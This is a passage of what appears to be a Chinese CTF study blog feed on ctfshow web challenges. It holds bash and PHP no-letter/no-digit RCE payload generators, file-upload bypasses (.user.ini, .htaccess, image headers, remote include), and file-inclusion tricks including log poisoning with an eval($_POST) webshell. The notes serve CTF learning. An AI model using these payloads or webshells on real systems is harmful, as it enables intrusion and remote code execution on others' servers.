<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把$0换成$&#123;!#&#125;  发现在php无法解析   __=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;  这样之后通过__作为中间件替换一下得到</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用$#构造:</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;##&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;#&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用$?构造</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$((2#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;__&#125;&#x27;).replace(&#x27;2&#x27;,&#x27;$&#123;____&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;_____&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用$(())构造:</span><br><span class="line">cmd=&#x27;cat /flag&#x27;</span><br><span class="line">payload=&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span><br><span class="line">for c in cmd:</span><br><span class="line">        payload+=f&#x27;\\\\$((2#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;,&#x27;$&#123;__&#125;&#x27;).replace(&#x27;2&#x27;,&#x27;$&#123;____&#125;&#x27;).replace(&#x27;0&#x27;,&#x27;$&#123;_____&#125;&#x27;)</span><br><span class="line">payload+=&#x27;\\\&#x27;&#x27;</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>
<h1 id="无字母无数字rcephp"><a class="markdownIt-Anchor" href="#无字母无数字rcephp"></a> 无字母无数字rce(php):</h1>
<h2 id="1异或"><a class="markdownIt-Anchor" href="#1异或"></a> 1.异或:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//改为题目的正则</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>)) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>) ^ <span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span> = <span class="variable">$contents</span> . <span class="variable">$c</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in arg:</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># Use &#x27;with&#x27; to handle file opening and closing automatically</span></span><br><span class="line">            <span class="keyword">while</span> True:</span><br><span class="line">                t = f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">                <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                    <span class="comment"># print(i)  # This line can be uncommented for debugging purposes</span></span><br><span class="line">                    s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    output = f<span class="string">&quot;(\&quot;&#123;s1&#125;\&quot;^\&quot;&#123;s2&#125;\&quot;)&quot;</span>  <span class="comment"># Use f-string for better readability</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    param = <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2或运算"><a class="markdownIt-Anchor" href="#2或运算"></a> 2.或运算:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件或创建文件</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双重循环，遍历256的每个值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">256</span>; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将十进制数转换为十六进制</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 正则表达式，匹配字母或数字</span></span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;    </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果十六进制转为二进制后匹配成功，跳过此值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>)) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// URL解码并做按位或运算</span></span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="string">&#x27;%&#x27;</span> . <span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>) | <span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果字符是可打印字符，记录内容</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>) &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span> = <span class="variable">$contents</span> . <span class="variable">$c</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果写入文件并关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打开文件并读取内容</span></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 读取所有行</span></span><br><span class="line">        lines = f.<span class="title function_ invoke__">readlines</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历输入参数</span></span><br><span class="line">        <span class="keyword">for</span> i in arg:</span><br><span class="line">            <span class="comment"># 查找与输入匹配的行</span></span><br><span class="line">            <span class="keyword">for</span> line in lines:</span><br><span class="line">                <span class="keyword">if</span> line.<span class="title function_ invoke__">startswith</span>(i):</span><br><span class="line">                    s1 += line[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                    s2 += line[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回拼接结果</span></span><br><span class="line">    output = f<span class="string">&quot;(\&quot;&#123;s1&#125;\&quot;|\&quot;&#123;s2&#125;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无限循环，处理用户输入</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    param = <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3取反"><a class="markdownIt-Anchor" href="#3取反"></a> 3.取反:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h1 id="open_basedir绕过"><a class="markdownIt-Anchor" href="#open_basedir绕过"></a> <strong>open_basedir绕过</strong>:</h1>
]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2>
<h3 id="1-userini的使用"><a class="markdownIt-Anchor" href="#1-userini的使用"></a> 1. .user.ini的使用:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，最后访问index.php，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br><span class="line">    上传时把Content-Type: image/jpg  类型改为这样</span><br></pre></td></tr></table></figure>
<h3 id="2绕过内容里不能包含php"><a class="markdownIt-Anchor" href="#2绕过内容里不能包含php"></a> 2.绕过内容里不能包含php:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3增加文件头"><a class="markdownIt-Anchor" href="#3增加文件头"></a> 3.增加文件头:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>魔术头（十六进制）</th>
<th>魔术头（ASCII）</th>
<th>示例用途</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>GIF89a</strong></td>
<td><code>47 49 46 38 39 61</code></td>
<td><code>GIF89a</code></td>
<td>正规 GIF 图</td>
</tr>
<tr>
<td><strong>GIF87a</strong></td>
<td><code>47 49 46 38 37 61</code></td>
<td><code>GIF87a</code></td>
<td>老版本 GIF 图</td>
</tr>
<tr>
<td><strong>PNG</strong></td>
<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
<td><code>.PNG....</code></td>
<td>PNG 图</td>
</tr>
<tr>
<td><strong>JPG</strong> / JPEG</td>
<td><code>FF D8 FF</code></td>
<td>N/A</td>
<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
</tr>
<tr>
<td><strong>PDF</strong></td>
<td><code>25 50 44 46 2D</code></td>
<td><code>%PDF-</code></td>
<td>经典文档上传绕过</td>
</tr>
<tr>
<td><strong>ZIP</strong></td>
<td><code>50 4B 03 04</code></td>
<td><code>PK..</code></td>
<td>上传压缩包</td>
</tr>
<tr>
<td><strong>RAR</strong></td>
<td><code>52 61 72 21 1A 07 00</code></td>
<td><code>Rar!...</code></td>
<td>压缩文件</td>
</tr>
<tr>
<td><strong>EXE</strong>（Windows）</td>
<td><code>4D 5A</code></td>
<td><code>MZ</code></td>
<td>可执行文件</td>
</tr>
<tr>
<td><strong>ELF</strong>（Linux）</td>
<td><code>7F 45 4C 46</code></td>
<td><code>.ELF</code></td>
<td>Linux 二进制</td>
</tr>
<tr>
<td><strong>MP3</strong></td>
<td><code>49 44 33</code></td>
<td><code>ID3</code></td>
<td>音频文件头</td>
</tr>
<tr>
<td><strong>DOCX / XLSX / PPTX</strong></td>
<td><code>50 4B 03 04</code></td>
<td>ZIP！</td>
<td>Office 新版其实是 ZIP 容器</td>
</tr>
<tr>
<td><strong>OLD DOC (97-2003)</strong></td>
<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
<td>N/A</td>
<td>老式 Office 文件</td>
</tr>
</tbody>
</table>
<h3 id="4远程包含"><a class="markdownIt-Anchor" href="#4远程包含"></a> 4.远程包含:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
<h3 id="5通过jpggifpng二次渲染"><a class="markdownIt-Anchor" href="#5通过jpggifpng二次渲染"></a> 5.通过jpg.gif.png二次渲染;</h3>
<h4 id="1是否存在二次渲染"><a class="markdownIt-Anchor" href="#1是否存在二次渲染"></a> 1.是否存在二次渲染:</h4>
<table>
<thead>
<tr>
<th>条件</th>
<th>说明</th>
<th>判断方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>上传后图像被重新压缩</td>
<td>MD5不一致</td>
<td>上传后下载图片对比</td>
</tr>
<tr>
<td>上传的 EXIF 信息被清除</td>
<td>文件属性被抹掉</td>
<td><code>exif_read_data()</code> 检查</td>
</tr>
<tr>
<td>伪代码失效</td>
<td>木马内容被去掉</td>
<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
</tr>
<tr>
<td>文件大小被大幅缩小</td>
<td>说明被重新处理</td>
<td>查看上传前后大小差距</td>
</tr>
<tr>
<td>Webshell 不再执行</td>
<td>二次渲染清除了恶意代码</td>
<td>手动访问判断是否能执行PHP代码</td>
</tr>
</tbody>
</table>
<h3 id="6通过htaccess包含"><a class="markdownIt-Anchor" href="#6通过htaccess包含"></a> 6.通过.htaccess包含:</h3>
<p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2>
<h3 id="包含函数"><a class="markdownIt-Anchor" href="#包含函数"></a> 包含函数</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
<h3 id="1通过伪协议"><a class="markdownIt-Anchor" href="#1通过伪协议"></a> 1.通过伪协议</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
<h4 id="1phpfilter-使用方法"><a class="markdownIt-Anchor" href="#1phpfilter-使用方法"></a> 1.php://filter 使用方法</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">远程包含:</span><br><span class="line">php:<span class="comment">//filter/resource=http://www.baidu.com  </span></span><br></pre></td></tr></table></figure>
<h4 id="2phpinput-使用方法"><a class="markdownIt-Anchor" href="#2phpinput-使用方法"></a> 2.php://input 使用方法:</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
<h4 id="3data使用方法"><a class="markdownIt-Anchor" href="#3data使用方法"></a> 3.data://使用方法</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
<h4 id="4file使用方法"><a class="markdownIt-Anchor" href="#4file使用方法"></a> 4.file://使用方法</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
<h3 id="2通过日志"><a class="markdownIt-Anchor" href="#2通过日志"></a> 2.通过日志</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line">/etc/passwd    ---敏感路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
<h3 id="3得到路径"><a class="markdownIt-Anchor" href="#3得到路径"></a> 3.得到路径:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc 目录下存储了关于系统和运行中进程的信息。每个运行中的进程都会在 /proc/[pid]/cmdline 文件中保存该进程的启动命令行信息</span><br></pre></td></tr></table></figure>
<h3 id="4基于oracle的文件读取攻击"><a class="markdownIt-Anchor" href="#4基于oracle的文件读取攻击"></a> 4.<strong>基于oracle的文件读取攻击</strong>：</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过编码的转换得到想要的数据   --</span><br><span class="line">    php:<span class="comment">//filter/read=convert.iconv.UTF8.CSISO2022KR/resource=2.txt      ---得到)C    length=4</span></span><br><span class="line"> ---再通过base64-encode编码去掉不可见字符,再通过base64-decode还原得到需要的字符  一个字符需要扩展，所以得把命令base64编码  </span><br><span class="line">   </span><br></pre></td></tr></table></figure>
